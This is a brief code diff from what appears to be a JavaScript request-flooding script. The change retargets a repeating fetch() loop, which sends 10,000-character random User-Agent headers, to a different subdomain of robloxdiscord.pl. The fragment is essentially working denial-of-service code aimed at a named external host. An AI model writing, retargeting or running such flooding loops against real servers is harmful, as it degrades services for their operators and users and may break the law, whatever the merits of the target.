@@ -19,7 +19,7 @@ function makeid(length) {
     return result;
     }
     setInterval(()=>{
-        fetch("https://api-bytow.robloxdiscord.pl/agg", {
+        fetch("https://apibytow.robloxdiscord.pl/agg", {
             "credentials": "omit",
             "headers": {
                 "User-Agent": makeid(10000),
